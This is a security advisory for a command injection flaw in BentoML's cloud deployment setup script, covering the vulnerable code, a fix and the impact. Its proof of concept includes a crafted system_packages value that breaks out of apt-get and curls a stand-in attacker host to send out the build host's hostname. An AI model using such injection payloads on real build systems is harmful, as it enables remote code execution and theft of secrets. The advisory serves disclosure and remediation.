# [H] BentoML: Command Injection in cloud deployment setup script

## Summary
Severity: High
Advisory: GHSA-fgv4-6jr3-jgfw
CVE: CVE-2026-35043
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-fgv4-6jr3-jgfw
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.38

## Details
Commit ce53491 (March 24) fixed command injection via `system_packages` in Dockerfile templates and `images.py` by adding `shlex.quote`. However, the cloud deployment path in `src/bentoml/_internal/cloud/deployment.py` was not included in the fix. Line 1648 interpolates `system_packages` directly into a shell command using an f-string without any quoting.

The generated script is uploaded to BentoCloud as `setup.sh` and executed on the cloud build infrastructure during deployment, making this a remote code execution on the CI/CD tier.

## Details

**Fixed paths (commit ce53491):**
- `src/_bentoml_sdk/images.py:88` - added `shlex.quote(package)`
- `src/bentoml/_internal/bento/build_config.py:505` - added `bash_quote` Jinja2 filter
- Jinja2 templates: `base_debian.j2`, `base_alpine.j2`, etc.

**Unfixed path:**

`src/bentoml/_internal/cloud/deployment.py`, line 1648:

    def _build_setup_script(bento_dir: str, image: Image | None) -> bytes:
        content = b""
        config = BentoBuildConfig.from_bento_dir(bento_dir)
        if config.docker.system_packages:
            content += f"apt-get update && apt-get install -y {' '.join(config.docker.system_packages)} || exit 1\n".encode()

`system_packages` values from `bentofile.yaml` are joined with spaces and interpolated directly into the `apt-get install` command. No `shlex.quote`.

**Remote execution confirmed:**
- Line 905: `setup_script = _build_setup_script(bento_dir, svc.image)` in `_init_deployment_files`
- Line 908: `upload_files.append(("setup.sh", setup_script))` uploads to BentoCloud
- Line 914: `self.upload_files(upload_files, ...)` sends to the remote deployment
- The script runs on the cloud build infrastructure during container setup

**Second caller at line 1068:** `_build_setup_script` is also called during `Deployment.watch()` for dev mode hot-reload deployments.

## Proof of Concept

bentofile.yaml:

    service: "service:svc"
    docker:
      system_packages:
        - "curl"
        - "jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}#"

Generated setup.sh:

    apt-get update && apt-get install -y curl jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}# || exit 1

The semicolon terminates the `apt-get` command. `${IFS}` is used for spaces (works in bash, avoids YAML parsing issues). The `#` comments out the trailing `|| exit 1`. The injected `curl` exfiltrates the hostname of the build infrastructure to the attacker.

## Impact

A malicious `bentofile.yaml` achieves remote code execution on BentoCloud's build infrastructure (or enterprise Yatai/Kubernetes build nodes) during deployment. Attack scenarios:

1. **Supply chain:** A shared Bento from a public model hub contains a poisoned `bentofile.yaml`. When deployed to BentoCloud, the injected command runs on the build infrastructure.
2. **Insider threat:** A data scientist with deploy permissions injects commands into `system_packages` to exfiltrate secrets from the build environment (cloud credentials, API keys, other tenants' data).
3. **CI/CD compromise:** The build infrastructure typically has access to container registries, artifact storage, and deployment APIs, making this a pivot point for broader infrastructure compromise.

## Local Reproduction Steps

Tested and confirmed on Ubuntu with BentoML source at commit 0772581.

Step 1: Create a directory with a malicious bentofile.yaml:

    mkdir /tmp/bento-pwn
    cat > /tmp/bento-pwn/bentofile.yaml << 'EOF'
    service: "service:svc"
    docker:
      system_packages:
        - "curl"
        - "jq; touch /tmp/PWNED_BY_INJECTION #"
    EOF

Step 2: Generate the setup script using the vulnerable code path (extracted from deployment.py:1648):

    python3 -c "
    import yaml
    with open('/tmp/bento-pwn/bentofile.yaml') as f:
        config = yaml.safe_load(f)
    pkgs = config['docker']['system_packages']
    script = f\"apt-get update && apt-get install -y {' '.join(pkgs)} || exit 1\n\"
    print('Generated setup.sh:')
    print(script)
    with open('/tmp/bento-pwn/setup.sh', 'w') as f:
        f.write(script)
    "

Step 3: Execute and verify:

    rm -f /tmp/PWNED_BY_INJECTION
    bash /tmp/bento-pwn/setup.sh
    ls -la /tmp/PWNED_BY_INJECTION

Result: `/tmp/PWNED_BY_INJECTION` is created, confirming the injected `touch` command executed. The semicolon broke out of `apt-get install`, the injected command ran, and `#` commented out the error handler.

Generated setup.sh content:

    apt-get update && apt-get install -y curl jq; touch /tmp/PWNED_BY_INJECTION # || exit 1

For comparison, the fixed version (with shlex.quote) would generate:

    apt-get update && apt-get install -y curl 'jq; touch /tmp/PWNED_BY_INJECTION #' || exit 1

The single quotes from shlex.quote neutralize the semicolon and hash, treating the entire string as a literal package name argument to apt-get.

## Suggested Fix

Apply `shlex.quote` to each package name, matching the fix in `images.py`:

    if config.docker.system_packages:
        quoted = ' '.join(shlex.quote(p) for p in config.docker.system_packages)
        content += f"apt-get update && apt-get install -y {quoted} || exit 1\n".encode()

— Koda Reef

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw
- https://nvd.nist.gov/vuln/detail/CVE-2026-33744
- https://nvd.nist.gov/vuln/detail/CVE-2026-35043
- https://github.com/bentoml/BentoML
- https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-158.yaml
